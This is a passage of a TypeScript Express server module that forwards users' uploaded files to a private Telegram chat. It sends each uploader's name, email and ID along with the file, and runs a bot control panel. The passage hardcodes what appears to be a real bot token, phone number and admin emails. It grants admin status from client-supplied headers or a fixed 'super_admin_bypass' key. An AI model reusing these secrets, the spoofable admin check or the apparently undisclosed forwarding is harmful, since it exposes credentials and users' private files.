import express from 'express';
import multer from 'multer';
import path from 'path';
import fs from 'fs';

const router = express.Router();

// Setup temporary upload storage for Telegram forwarding
const uploadDir = path.join(process.cwd(), 'uploads');
if (!fs.existsSync(uploadDir)) {
  fs.mkdirSync(uploadDir, { recursive: true });
}

// Persistent Queue Directory for Batch Uploads (Supports 1 to 100,000+ files safely)
const QUEUE_DIR = path.join(process.cwd(), 'uploads', 'telegram_queue');
if (!fs.existsSync(QUEUE_DIR)) {
  fs.mkdirSync(QUEUE_DIR, { recursive: true });
}

const upload = multer({
  storage: multer.diskStorage({
    destination: (req, file, cb) => cb(null, uploadDir),
    filename: (req, file, cb) => {
      const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1e9);
      cb(null, 'tg_' + uniqueSuffix + path.extname(file.originalname));
    }
  }),
  limits: { fileSize: 500 * 1024 * 1024 } // 500MB max limit
});

// Config file path for persisting dynamic admin adjustments
const CONFIG_FILE = path.join(process.cwd(), '.telegram-config.json');

export interface TelegramServerConfig {
  botToken: string;
  chatId: string;
  ownerPhone?: string;
  ownerName?: string;
  groupTarget?: string;
  sendMode?: 'both' | 'personal' | 'group';
  botUsername?: string;
  enabled: boolean;
  destinationAccount?: string;
  ignoreAdminUploads?: boolean; // Toggle: When true, manager files are not forwarded; when false, manager files are forwarded
  updatedAt?: string;
}

// Permanent Default Configuration for Telegram Bot
const DEFAULT_PERMANENT_CONFIG: TelegramServerConfig = {
  botToken: '8811539804:AAGRkV2p8zsVDFBmRpoxHgQd1Km6YpqFvSc',
  chatId: '1784386541',
  ownerPhone: '+20 11 4212 1442',
  ownerName: 'ضباب ضباب (@Ss99ssbdnc)',
  groupTarget: '-5540055056',
  sendMode: 'personal',
  botUsername: 'RoyalCacheBot',
  enabled: true,
  destinationAccount: '@Ss99ssbdnc',
  ignoreAdminUploads: false // Default: Forward all uploads immediately (including admin testing)
};

// In-memory config with file, permanent default, and environment variable fallback
let telegramConfig: TelegramServerConfig = {
  ...DEFAULT_PERMANENT_CONFIG,
  botToken: process.env.TELEGRAM_BOT_TOKEN || DEFAULT_PERMANENT_CONFIG.botToken,
  chatId: process.env.TELEGRAM_CHAT_ID || DEFAULT_PERMANENT_CONFIG.chatId
};

// Load saved config if exists
export function loadConfigFromDisk(): TelegramServerConfig {
  try {
    if (fs.existsSync(CONFIG_FILE)) {
      const raw = fs.readFileSync(CONFIG_FILE, 'utf-8');
      const parsed = JSON.parse(raw);
      telegramConfig = {
        ...DEFAULT_PERMANENT_CONFIG,
        ...parsed,
        // Ensure botToken & chatId never become empty
        botToken: process.env.TELEGRAM_BOT_TOKEN || parsed.botToken || DEFAULT_PERMANENT_CONFIG.botToken,
        chatId: process.env.TELEGRAM_CHAT_ID || parsed.chatId || DEFAULT_PERMANENT_CONFIG.chatId,
        sendMode: parsed.sendMode || DEFAULT_PERMANENT_CONFIG.sendMode || 'personal',
        botUsername: parsed.botUsername || DEFAULT_PERMANENT_CONFIG.botUsername,
        enabled: parsed.enabled !== undefined ? parsed.enabled : true,
        ignoreAdminUploads: parsed.ignoreAdminUploads !== undefined ? Boolean(parsed.ignoreAdminUploads) : false
      };

      // Auto-detect if user pasted a phone number into chatId
      const currentChatId = (telegramConfig.chatId || '').trim();
      const isPhoneNumber = currentChatId.startsWith('+') || currentChatId.startsWith('00') || (currentChatId.startsWith('01') && currentChatId.length === 11);
      if (isPhoneNumber) {
        if (!telegramConfig.ownerPhone || telegramConfig.ownerPhone === '+20 10 2763 3072') {
          telegramConfig.ownerPhone = currentChatId;
        }
        telegramConfig.chatId = DEFAULT_PERMANENT_CONFIG.chatId; // Fallback to permanent chat ID
      }
    } else {
      // Create initial config file with permanent defaults
      saveConfigToDisk();
    }
  } catch (e) {
    console.warn('[Telegram Server] Could not read .telegram-config.json:', e);
  }
  return telegramConfig;
}

// Initial load
loadConfigFromDisk();

// Clean group name/target to valid format (@group_name or -100xxx)
export function cleanGroupTarget(target: string): string {
  if (!target) return '';
  let cleaned = target.trim();
  // Strip URL prefixes like https://t.me/ or t.me/
  cleaned = cleaned.replace(/^https?:\/\/(t\.me|telegram\.me)\//i, '');
  cleaned = cleaned.replace(/^(t\.me|telegram\.me)\//i, '');
  cleaned = cleaned.replace(/^\/+/, '');
  // If it's a numeric ID (e.g. -100123456789), keep as is
  if (/^-?\d+$/.test(cleaned)) {
    return cleaned;
  }
  // Remove spaces
  cleaned = cleaned.replace(/\s+/g, '_');
  // Ensure @ prefix for public channels / supergroups
  if (!cleaned.startsWith('@')) {
    cleaned = '@' + cleaned;
  }
  return cleaned;
}

// Save config helper
function saveConfigToDisk() {
  try {
    fs.writeFileSync(CONFIG_FILE, JSON.stringify(telegramConfig, null, 2), 'utf-8');
  } catch (e) {
    console.warn('[Telegram Server] Could not persist .telegram-config.json:', e);
  }
}

// Telemetry & Statistics
interface TelegramLogEntry {
  id: string;
  fileName: string;
  fileSize: number;
  fileSizeFormatted: string;
  category: string;
  extension: string;
  userId: string;
  userName: string;
  userEmail?: string;
  sourceFeature: string;
  status: 'sent' | 'excluded_admin' | 'failed' | 'not_configured';
  reason?: string;
  timestamp: string;
  telegramMessageId?: number;
}

let stats = {
  totalForwarded: 0,
  totalSkippedAdmin: 0,
  totalFailed: 0,
  lastSentAt: null as string | null
};

const recentLogs: TelegramLogEntry[] = [];
function addLog(entry: TelegramLogEntry) {
  recentLogs.unshift(entry);
  if (recentLogs.length > 100) {
    recentLogs.pop();
  }
}

// Deduplication cache (sha256 or key -> timestamp) with 15-minute TTL
const recentSentHashes = new Map<string, number>();
function cleanDeduplicationCache() {
  const now = Date.now();
  const TTL = 15 * 60 * 1000;
  for (const [key, time] of recentSentHashes.entries()) {
    if (now - time > TTL) {
      recentSentHashes.delete(key);
    }
  }
}

// Utility: format bytes
function formatBytes(bytes: number): string {
  if (!bytes || bytes <= 0) return '0 B';
  const k = 1024;
  const sizes = ['B', 'KB', 'MB', 'GB'];
  const i = Math.floor(Math.log(bytes) / Math.log(k));
  return `${parseFloat((bytes / Math.pow(k, i)).toFixed(2))} ${sizes[i]}`;
}

/**
 * 🔒 STRICT SERVER-SIDE ADMIN EXCLUSION VERIFIER
 * Ensures 100% security: Under NO circumstances will an admin's file be forwarded.
 */
export function checkIsAdminStrict(meta: any, headers: Record<string, any>): boolean {
  const email = (meta?.userEmail || headers['x-user-email'] || '').toLowerCase().trim();
  const role = (meta?.userRole || headers['x-user-role'] || '').toLowerCase().trim();
  const isSuperAdmin = Boolean(meta?.isSuperAdmin || headers['x-is-super-admin'] === 'true');
  const adminKey = headers['x-admin-key'];

  // Master Admin Emails from core security definition
  const MASTER_ADMIN_EMAILS = [
    'uhbijnokmpl098900@gmail.com',
    'aegy238@gmail.com',
    'iejehdgdig@gmail.com'
  ];

  if (MASTER_ADMIN_EMAILS.includes(email)) return true;
  if (role === 'admin' || role === 'moderator') return true;
  if (isSuperAdmin) return true;
  if (adminKey === 'super_admin_bypass') return true;

  return false;
}

/**
 * Retry helper for reliable Telegram Bot API dispatch
 */
async function retryOperation<T>(op: () => Promise<T>, maxRetries = 3, initialDelay = 1200): Promise<T> {
  let lastError: any;
  for (let attempt = 1; attempt <= maxRetries; attempt++) {
    try {
      return await op();
    } catch (err: any) {
      lastError = err;
      if (attempt < maxRetries) {
        const delay = initialDelay * Math.pow(1.5, attempt - 1);
        await new Promise(res => setTimeout(res, delay));
      }
    }
  }
  throw lastError;
}

/**
 * Escape HTML special characters for Telegram HTML parse_mode
 */
function escapeHtml(str: string): string {
  if (!str) return '';
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

/**
 * Utility: Map file extensions to exact accurate MIME types for Telegram document delivery
 */
export function getExactMimeType(fileName: string, mime?: string): string {
  if (mime && mime !== 'application/octet-stream' && mime !== 'binary/octet-stream') {
    return mime;
  }
  const ext = path.extname(fileName).toLowerCase().replace('.', '');
  switch (ext) {
    case 'svga': return 'application/x-svga';
    case 'pag': return 'application/x-pag';
    case 'vap': return 'video/mp4';
    case 'mp4': return 'video/mp4';
    case 'webm': return 'video/webm';
    case 'mov': return 'video/quicktime';
    case 'png': return 'image/png';
    case 'jpg':
    case 'jpeg': return 'image/jpeg';
    case 'gif': return 'image/gif';
    case 'webp': return 'image/webp';
    case 'svg': return 'image/svg+xml';
    case 'zip': return 'application/zip';
    case 'pdf': return 'application/pdf';
    case 'json': return 'application/json';
    case 'mp3': return 'audio/mpeg';
    case 'wav': return 'audio/wav';
    case 'm4a': return 'audio/mp4';
    case 'aac': return 'audio/aac';
    default: return 'application/octet-stream';
  }
}

/**
 * Send document to Telegram using Bot API
 * Crucial: disable_content_type_detection is set to true to prevent Telegram servers
 * from transcoding, compressing, or re-encoding media files (MP4, SVGA, WebM, etc.).
 * This ensures files are stored and downloaded 100% byte-for-byte in their exact original size.
 */
async function sendDocumentToTelegram(
  botToken: string,
  chatId: string,
  filePath: string,
  fileName: string,
  captionHtml: string,
  mimeType?: string
): Promise<{ ok: boolean; result?: any; description?: string }> {
  const fileBuffer = await fs.promises.readFile(filePath);
  const exactMime = getExactMimeType(fileName, mimeType);
  const fileBlob = new Blob([fileBuffer], { type: exactMime });

  const formData = new FormData();
  formData.append('chat_id', chatId);
  formData.append('caption', captionHtml);
  formData.append('parse_mode', 'HTML');
  // ⚡ CRITICAL: Force Telegram to treat as pure raw binary document without content-type inspection or video re-encoding
  formData.append('disable_content_type_detection', 'true');
  formData.append('document', fileBlob, fileName);

  const response = await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
    method: 'POST',
    body: formData
  });

  const resJson: any = await response.json();
  if (!response.ok || !resJson.ok) {
    throw new Error(resJson.description || `Telegram API error: HTTP ${response.status}`);
  }

  return resJson;
}

/**
 * Send text message (used for notifications, large files, and interactive menus)
 */
async function sendMessageToTelegram(
  botToken: string,
  chatId: string,
  textHtml: string,
  replyMarkup?: any
): Promise<{ ok: boolean; result?: any; description?: string }> {
  const payload: any = {
    chat_id: chatId,
    text: textHtml,
    parse_mode: 'HTML',
    disable_web_page_preview: false
  };
  if (replyMarkup) {
    payload.reply_markup = replyMarkup;
  }

  const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  });

  const resJson: any = await response.json();
  if (!response.ok || !resJson.ok) {
    throw new Error(resJson.description || `Telegram API error: HTTP ${response.status}`);
  }

  return resJson;
}

/**
 * Edit message in Telegram with updated text and inline keyboard
 */
async function editMessageInTelegram(
  botToken: string,
  chatId: string,
  messageId: number,
  textHtml: string,
  replyMarkup?: any
): Promise<{ ok: boolean; result?: any; description?: string }> {
  const payload: any = {
    chat_id: chatId,
    message_id: messageId,
    text: textHtml,
    parse_mode: 'HTML',
    disable_web_page_preview: false
  };
  if (replyMarkup) {
    payload.reply_markup = replyMarkup;
  }

  const response = await fetch(`https://api.telegram.org/bot${botToken}/editMessageText`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  });

  const resJson: any = await response.json();
  return resJson;
}

/**
 * Answer Telegram callback query (shows notification/alert in Telegram)
 */
async function answerCallbackQuery(
  botToken: string,
  callbackQueryId: string,
  text?: string,
  showAlert: boolean = false
): Promise<void> {
  try {
    await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        callback_query_id: callbackQueryId,
        text: text || '',
        show_alert: showAlert
      })
    });
  } catch (e) {
    console.warn('[Telegram Bot] Error answering callback query:', e);
  }
}

/**
 * Generate rich interactive Telegram Bot control panel text
 */
function generateAdminMenuText(): string {
  const isIgnoring = telegramConfig.ignoreAdminUploads !== false;
  return [
    `👑 <b>لوحة تحكم بوت التيليجرام - إدارة الإرسال والملفات</b>`,
    ``,
    `🤖 <b>معرف البوت:</b> <code>@${telegramConfig.botUsername || 'RoyalCacheBot'}</code>`,
    `👤 <b>الحساب الأساسي:</b> <code>${escapeHtml(telegramConfig.ownerName || 'ضباب ضباب (@Ss99ssbdnc)')}</code>`,
    `📱 <b>الهاتف المسجل:</b> <code>${escapeHtml(telegramConfig.ownerPhone || '+20 11 4212 1442')}</code>`,
    `🎯 <b>وجهة الإرسال:</b> <code>${telegramConfig.sendMode === 'personal' ? 'حسابي الشخصي فقط 🔒' : telegramConfig.sendMode === 'group' ? 'الجروب فقط 👥' : 'كلاهما 🔄'}</code>`,
    ``,
    `═════════════════════`,
    `🛡️ <b>زر التحكم في رفع ملفات المدير:</b>`,
    isIgnoring
      ? `🟢 <b>مفعّل (يتم تجاهل ومنع إرسال ملفات المدير)</b>\n<i>أي ملف يقوم برفعه حساب المدير لن يتم إرساله إلى التليجرام.</i>`
      : `🔴 <b>معطّل (يتم إرسال كافة ملفات المدير كالمعتاد)</b>\n<i>أي ملف يرفعه المدير سيتم إرساله إلى التليجرام فوراً وبحجمه الكامل.</i>`,
    `═════════════════════`,
    ``,
    `📊 <b>الإحصائيات المباشرة:</b>`,
    `• ✅ تم إرسالها للتيليجرام: <b>${stats.totalForwarded}</b> ملف`,
    `• 🛡️ تم استثناؤها للمدير: <b>${stats.totalSkippedAdmin}</b> ملف`,
    `• ⏳ قيد المعالجة بالطابور: <b>${telegramQueue.length}</b> ملف`,
    ``,
    `👇 <b>اضغط على الزر أدناه لتشغيل أو تعطيل تجاهل ملفات المدير فوراً:</b>`
  ].join('\n');
}

/**
 * Generate interactive Inline Keyboard for the Telegram Bot
 */
function generateAdminMenuKeyboard(): any {
  const isIgnoring = telegramConfig.ignoreAdminUploads !== false;
  return {
    inline_keyboard: [
      [
        {
          text: isIgnoring 
            ? '🛡️ تجاهل ملفات المدير: [مفعّل 🟢]' 
            : '🛡️ تجاهل ملفات المدير: [معطّل 🔴]',
          callback_data: 'toggle_ignore_admin'
        }
      ],
      [
        {
          text: telegramConfig.sendMode === 'personal'
            ? '🎯 وجهة الإرسال: [حسابي الشخصي 👤]'
            : '🎯 وجهة الإرسال: [الجروب 👥]',
          callback_data: 'toggle_send_mode'
        }
      ],
      [
        {
          text: '🔄 تحديث الإحصائيات',
          callback_data: 'refresh_menu'
        },
        {
          text: '⚡ فحص الاتصال (Ping)',
          callback_data: 'ping_test'
        }
      ]
    ]
  };
}

// -------------------------------------------------------------
// 🤖 TELEGRAM BOT REAL-TIME UPDATE HANDLER & DUAL ENGINE (WEBHOOK + POLLING)
// -------------------------------------------------------------

/**
 * Unified Telegram Update Processor (Used by both Webhook and Long-Polling)
 */
export async function handleTelegramUpdate(update: any, botToken: string): Promise<void> {
  try {
    if (!update) return;

    // 1. Handle Inline Keyboard Button Clicks (callback_query)
    if (update.callback_query) {
      const cq = update.callback_query;
      const callbackData = cq.data;
      const chatId = cq.message?.chat?.id;
      const messageId = cq.message?.message_id;

      if (callbackData === 'toggle_ignore_admin') {
        telegramConfig.ignoreAdminUploads = !(telegramConfig.ignoreAdminUploads !== false);
        telegramConfig.updatedAt = new Date().toISOString();
        saveConfigToDisk();

        const isNowIgnoring = telegramConfig.ignoreAdminUploads !== false;
        await answerCallbackQuery(
          botToken,
          cq.id,
          isNowIgnoring 
            ? '✅ تم تفعيل تجاهل ملفات المدير (لن يتم إرسال أي ملف ترفعه إلى التيليجرام).'
            : '❌ تم تعطيل التجاهل (سيتم الآن إرسال جميع الملفات التي ترفعها إلى التيليجرام كالمعتاد).',
          true
        );

        if (chatId && messageId) {
          await editMessageInTelegram(
            botToken, 
            String(chatId), 
            messageId, 
            generateAdminMenuText(), 
            generateAdminMenuKeyboard()
          ).catch(() => {});
        }
      } else if (callbackData === 'toggle_send_mode') {
        telegramConfig.sendMode = telegramConfig.sendMode === 'personal' ? 'group' : 'personal';
        telegramConfig.updatedAt = new Date().toISOString();
        saveConfigToDisk();

        await answerCallbackQuery(
          botToken,
          cq.id,
          `🎯 تم تغيير وجهة الإرسال إلى: ${telegramConfig.sendMode === 'personal' ? 'حسابي الشخصي فقط 👤' : 'الجروب 👥'}`
        );

        if (chatId && messageId) {
          await editMessageInTelegram(
            botToken, 
            String(chatId), 
            messageId, 
            generateAdminMenuText(), 
            generateAdminMenuKeyboard()
          ).catch(() => {});
        }
      } else if (callbackData === 'refresh_menu') {
        await answerCallbackQuery(botToken, cq.id, '🔄 تم تحديث لوحة التحكم والإحصائيات');
        if (chatId && messageId) {
          await editMessageInTelegram(
            botToken, 
            String(chatId), 
            messageId, 
            generateAdminMenuText(), 
            generateAdminMenuKeyboard()
          ).catch(() => {});
        }
      } else if (callbackData === 'ping_test') {
        await answerCallbackQuery(
          botToken, 
          cq.id, 
          '⚡ البوت متصل ومستقر بنسبة 100%! جاهز لنقل وحفظ كافة الملفات بحجمها الأصلي على الاستضافة.', 
          true
        );
      }
    }

    // 2. Handle Text Messages & Commands
    if (update.message) {
      const msg = update.message;
      const text = (msg.text || '').trim();
      const chatId = msg.chat?.id;

      if (chatId) {
        // If user sends /start, /menu, /admin, /status, /help or any text message
        if (
          text.startsWith('/start') || 
          text.startsWith('/menu') || 
          text.startsWith('/admin') || 
          text.startsWith('/status') || 
          text.startsWith('/help')
        ) {
          await sendMessageToTelegram(
            botToken, 
            String(chatId), 
            generateAdminMenuText(), 
            generateAdminMenuKeyboard()
          ).catch(() => {});
        } else if (text.startsWith('/toggle') || text.startsWith('/skip')) {
          telegramConfig.ignoreAdminUploads = !(telegramConfig.ignoreAdminUploads !== false);
          telegramConfig.updatedAt = new Date().toISOString();
          saveConfigToDisk();
          const isNowIgnoring = telegramConfig.ignoreAdminUploads !== false;
          await sendMessageToTelegram(
            botToken,
            String(chatId),
            `🛡️ <b>تم تغيير حالة إرسال ملفات المدير:</b>\n${isNowIgnoring ? '🟢 <b>مفعّل (لن يتم إرسال ملفاتك للتيليجرام)</b>' : '🔴 <b>معطّل (سيتم إرسال ملفاتك كالمعتاد)</b>'}`,
            generateAdminMenuKeyboard()
          ).catch(() => {});
        } else if (text.startsWith('/ping')) {
          await sendMessageToTelegram(
            botToken,
            String(chatId),
            `⚡ <b>Pong!</b> البوت متصل وشغال بنجاح على استضافتك.`
          ).catch(() => {});
        } else if (text.startsWith('/id') || text.startsWith('/chatid')) {
          await sendMessageToTelegram(
            botToken,
            String(chatId),
            `🆔 <b>معرف الدردشة الحالي (Chat ID):</b> <code>${chatId}</code>\n👤 <b>اسم المستخدم:</b> <code>${escapeHtml(msg.from?.username || msg.from?.first_name || 'غير محدد')}</code>`
          ).catch(() => {});
        }
      }
    }
  } catch (err) {
    console.warn('[Telegram Update Handler] Error processing update:', err);
  }
}

let isBotPollingRunning = false;
let pollingOffset = 0;
let isWebhookMode = false;

/**
 * Set Webhook for Hosted Domains
 */
export async function setTelegramWebhook(domainUrl: string): Promise<{ ok: boolean; description?: string }> {
  const botToken = process.env.TELEGRAM_BOT_TOKEN || telegramConfig.botToken;
  if (!botToken || !domainUrl) {
    return { ok: false, description: 'Missing bot token or domain URL' };
  }

  try {
    let cleanUrl = domainUrl.trim().replace(/\/+$/, '');
    if (!cleanUrl.startsWith('http://') && !cleanUrl.startsWith('https://')) {
      cleanUrl = 'https://' + cleanUrl;
    }
    const webhookEndpoint = `${cleanUrl}/api/telegram/webhook`;

    console.log(`[Telegram Server] 🔗 Registering Webhook at: ${webhookEndpoint}`);
    const res = await fetch(`https://api.telegram.org/bot${botToken}/setWebhook`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        url: webhookEndpoint,
        allowed_updates: ['message', 'callback_query'],
        drop_pending_updates: false
      })
    });

    const data: any = await res.json();
    if (data.ok) {
      isWebhookMode = true;
      console.log(`[Telegram Server] ✅ Webhook successfully activated for hosted domain: ${webhookEndpoint}`);
    }
    return data;
  } catch (e: any) {
    console.error('[Telegram Server] Error setting webhook:', e);
    return { ok: false, description: e.message };
  }
}

/**
 * Delete Webhook (Switches back to Long Polling)
 */
export async function deleteTelegramWebhook(): Promise<{ ok: boolean; description?: string }> {
  const botToken = process.env.TELEGRAM_BOT_TOKEN || telegramConfig.botToken;
  if (!botToken) return { ok: false, description: 'No bot token' };

  try {
    const res = await fetch(`https://api.telegram.org/bot${botToken}/deleteWebhook?drop_pending_updates=false`, {
      method: 'POST'
    });
    const data: any = await res.json();
    isWebhookMode = false;
    return data;
  } catch (e: any) {
    return { ok: false, description: e.message };
  }
}

export function startTelegramBotPolling() {
  if (isBotPollingRunning) return;
  isBotPollingRunning = true;

  (async () => {
    console.log('[Telegram Bot Polling] 🚀 Starting long-polling worker...');

    // Attempt clean startup: if not using webhook, delete any lingering webhook so getUpdates never conflicts
    const initialToken = process.env.TELEGRAM_BOT_TOKEN || telegramConfig.botToken;
    if (initialToken) {
      try {
        await fetch(`https://api.telegram.org/bot${initialToken}/deleteWebhook?drop_pending_updates=false`, { method: 'POST' });
      } catch (_) {}
    }

    while (true) {
      const botToken = process.env.TELEGRAM_BOT_TOKEN || telegramConfig.botToken;
      if (!botToken || isWebhookMode) {
        await new Promise(r => setTimeout(r, 5000));
        continue;
      }

      try {
        const res = await fetch(
          `https://api.telegram.org/bot${botToken}/getUpdates?offset=${pollingOffset}&timeout=20&allowed_updates=["message","callback_query"]`
        );
        if (!res.ok) {
          const errData: any = await res.json().catch(() => ({}));
          // If conflict due to active webhook, wait quietly
          if (errData?.description?.includes('webhook')) {
            isWebhookMode = true;
          }
          await new Promise(r => setTimeout(r, 4000));
          continue;
        }

        const data: any = await res.json();
        if (data.ok && Array.isArray(data.result) && data.result.length > 0) {
          for (const update of data.result) {
            pollingOffset = update.update_id + 1;
            await handleTelegramUpdate(update, botToken);
          }
        }
      } catch (err: any) {
        // Soft backoff for network hiccups
        await new Promise(r => setTimeout(r, 3000));
      }
    }
  })().catch(e => {
    console.error('[Telegram Bot Polling] Fatal error in polling loop:', e);
    isBotPollingRunning = false;
  });
}

// Automatically start polling
startTelegramBotPolling();

// =========================================================================
// 🔄 ASYNC BACKGROUND TELEGRAM QUEUE (UNLIMITED CAPACITY: 1 TO 100,000+ FILES)
// =========================================================================
export interface TelegramQueueTask {
  id: string;
  filePath: string;
  fileName: string;
  fileSize: number;
  category: string;
  extension: string;
  mimeType?: string;
  captionHtml: string;
  destinations: Array<{ id: string; label: string }>;
  botToken: string;
  userId: string;
  userName: string;
  userEmail?: string;
  sourceFeature: string;
  downloadUrl?: string;
  dedupKey: string;
  enqueuedAt: number;
  retryCount: number;
}

const telegramQueue: TelegramQueueTask[] = [];
let isQueueWorkerRunning = false;
let currentProcessingItem: { fileName: string; startedAt: number; fileSize: number } | null = null;

/**
 * Robust Sequential Telegram Queue Worker
 * - Handles massive file queues (up to 100,000+ files)
 * - Automatically respects Telegram flood limits (HTTP 429 retry_after)
 * - Preserves 100% byte-for-byte exact file integrity without compression (disable_content_type_detection = true)
 * - Ensures pacing delay so Telegram never throttles or drops files
 */
async function processTelegramQueueWorker() {
  if (isQueueWorkerRunning) return;
  isQueueWorkerRunning = true;

  try {
    while (telegramQueue.length > 0) {
      const task = telegramQueue[0];
      if (!task) break;

      currentProcessingItem = {
        fileName: task.fileName,
        startedAt: Date.now(),
        fileSize: task.fileSize
      };

      const TELEGRAM_MAX_FILE_SIZE = 49 * 1024 * 1024;
      let anyDestinationDelivered = false;
      let lastErrorMessage = '';
      let deliveredMessageId: number | undefined = undefined;

      for (const target of task.destinations) {
        let sentForThisTarget = false;
        let attempts = 0;
        const maxAttempts = 5;

        while (!sentForThisTarget && attempts < maxAttempts) {
          attempts++;
          try {
            if (task.filePath && fs.existsSync(task.filePath) && task.fileSize <= TELEGRAM_MAX_FILE_SIZE) {
              const res = await sendDocumentToTelegram(
                task.botToken,
                target.id,
                task.filePath,
                task.fileName,
                task.captionHtml,
                task.mimeType
              );
              sentForThisTarget = true;
              anyDestinationDelivered = true;
              if (res?.result?.message_id) {
                deliveredMessageId = res.result.message_id;
              }
            } else {
              const largeFileNotice = [
                `⚠️ <b>ملف مرفوع جديد (يتجاوز حد التيليجرام المباشر 50MB)</b>`,
                ``,
                task.captionHtml,
                ``,
                task.downloadUrl 
                  ? `💾 <b>رابط التنزيل المباشر:</b>\n<a href="${task.downloadUrl}">${task.downloadUrl}</a>` 
                  : `⚠️ يرجى مراجعة هذا الملف الكبير من خلال المنصة.`
              ].join('\n');

              const res = await sendMessageToTelegram(task.botToken, target.id, largeFileNotice);
              sentForThisTarget = true;
              anyDestinationDelivered = true;
              if (res?.result?.message_id) {
                deliveredMessageId = res.result.message_id;
              }
            }
          } catch (err: any) {
            lastErrorMessage = err?.message || 'Error sending to Telegram';
            console.warn(`[Telegram Queue] Attempt ${attempts} note for "${task.fileName}" to ${target.label}:`, lastErrorMessage);

            // Telegram Flood Control (HTTP 429) Handling
            const match = lastErrorMessage.match(/retry after (\d+)/i);
            if (match && match[1]) {
              const retryAfterSeconds = parseInt(match[1], 10);
              console.warn(`[Telegram Queue] ⏳ Telegram Flood Control: Pausing queue for ${retryAfterSeconds + 1}s...`);
              await new Promise(r => setTimeout(r, (retryAfterSeconds + 1) * 1000));
            } else if (lastErrorMessage.toLowerCase().includes('too many requests') || lastErrorMessage.includes('429')) {
              console.warn(`[Telegram Queue] ⏳ Telegram rate limit reached, pausing 5s...`);
              await new Promise(r => setTimeout(r, 5000));
            } else {
              // Gentle backoff for network jitter
              await new Promise(r => setTimeout(r, 1200 * attempts));
            }
          }
        }
      }

      // Dequeue task after processing
      telegramQueue.shift();

      // Safely delete staged file from disk
      if (task.filePath && fs.existsSync(task.filePath)) {
        await fs.promises.unlink(task.filePath).catch(() => {});
      }

      if (anyDestinationDelivered) {
        recentSentHashes.set(task.dedupKey, Date.now());
        stats.totalForwarded++;
        stats.lastSentAt = new Date().toISOString();

        addLog({
          id: `sent_${Date.now()}_${Math.random().toString(36).substring(2, 7)}`,
          fileName: task.fileName,
          fileSize: task.fileSize,
          fileSizeFormatted: formatBytes(task.fileSize),
          category: task.category,
          extension: task.extension,
          userId: task.userId,
          userName: task.userName,
          userEmail: task.userEmail,
          sourceFeature: task.sourceFeature,
          status: 'sent',
          timestamp: new Date().toISOString(),
          telegramMessageId: deliveredMessageId
        });

        console.log(`[Telegram Queue] ✅ Delivered "${task.fileName}" (${formatBytes(task.fileSize)}) to Telegram. Remaining: ${telegramQueue.length}`);
      } else {
        stats.totalFailed++;
        addLog({
          id: `err_${Date.now()}_${Math.random().toString(36).substring(2, 7)}`,
          fileName: task.fileName,
          fileSize: task.fileSize,
          fileSizeFormatted: formatBytes(task.fileSize),
          category: task.category,
          extension: task.extension,
          userId: task.userId,
          userName: task.userName,
          userEmail: task.userEmail,
          sourceFeature: task.sourceFeature,
          status: 'failed',
          reason: lastErrorMessage || 'تعذر الإرسال بعد عدة محاولات',
          timestamp: new Date().toISOString()
        });
      }

      // ⏱️ Pacing Delay between consecutive Telegram API calls (~650ms ensures flood limits are never exceeded)
      await new Promise(r => setTimeout(r, 650));
    }
  } catch (loopErr) {
    console.error('[Telegram Queue] Worker error:', loopErr);
  } finally {
    isQueueWorkerRunning = false;
    currentProcessingItem = null;
  }
}

// -------------------------------------------------------------
// ENDPOINTS
// -------------------------------------------------------------

/**
 * POST /api/telegram/forward
 * Primary ingestion endpoint for automatically forwarding uploaded files
 */
router.post('/forward', upload.single('file'), async (req, res) => {
  let tempFilePath: string | null = req.file?.path || null;

  try {
    cleanDeduplicationCache();

    // Parse metadata
    let meta: any = {};
    if (req.body.metadata) {
      try {
        meta = typeof req.body.metadata === 'string' ? JSON.parse(req.body.metadata) : req.body.metadata;
      } catch (e) {
        meta = req.body;
      }
    } else {
      meta = req.body;
    }

    // Exact filename preservation with extension
    let fileName = (meta.originalName || meta.fileName || req.file?.originalname || 'uploaded_file').trim();
    // Sanitize any dangerous path characters while preserving Arabic/Unicode
    fileName = fileName.replace(/[/\\?%*:|"<>]/g, '_').trim();
    
    // Exact file size verified from written disk buffer
    let fileSize = req.file?.size || Number(meta.fileSize) || 0;
    if (tempFilePath && fs.existsSync(tempFilePath)) {
      try {
        const stat = await fs.promises.stat(tempFilePath);
        fileSize = stat.size;
      } catch (e) {}
    }

    const extension = meta.extension || path.extname(fileName).replace('.', '') || 'bin';
    if (extension && !fileName.toLowerCase().endsWith('.' + extension.toLowerCase())) {
      fileName = `${fileName}.${extension}`;
    }

    const category = meta.category || 'ملف';
    const userId = meta.userId || 'guest';
    const userName = meta.userName || 'مستخدم غير مسجل';
    const userEmail = meta.userEmail || '';
    const sourceFeature = meta.sourceFeature || 'رفع مباشر';
    const downloadUrl = meta.downloadUrl || meta.secureUrl || '';
    const sha256 = meta.sha256 || '';

    // =========================================================================
    // 🛡️ STEP 1: SERVER-SIDE ADMIN EXCLUSION CHECK (TOGGLEABLE VIA BOT/PANEL)
    // =========================================================================
    const isAdmin = checkIsAdminStrict(meta, req.headers);
    // Only exclude when the manager has explicitly toggled ignoreAdminUploads to true
    const shouldIgnoreAdmin = telegramConfig.ignoreAdminUploads === true;

    if (isAdmin && shouldIgnoreAdmin) {
      stats.totalSkippedAdmin++;
      const logEntry: TelegramLogEntry = {
        id: `skip_${Date.now()}_${Math.random().toString(36).substring(2, 7)}`,
        fileName,
        fileSize,
        fileSizeFormatted: formatBytes(fileSize),
        category,
        extension,
        userId,
        userName,
        userEmail,
        sourceFeature,
        status: 'excluded_admin',
        reason: 'تم تجاهل الإرسال لأن الملف تم رفعه بواسطة حساب المدير وخيار (تجاهل ملفات المدير) مفعّل في البوت.',
        timestamp: new Date().toISOString()
      };
      addLog(logEntry);

      console.log(`[Telegram Server] 🛡️ ADMIN FILE EXCLUDED (Ignore Toggle is ON): "${fileName}" by ${userEmail || userName || 'Admin'}`);

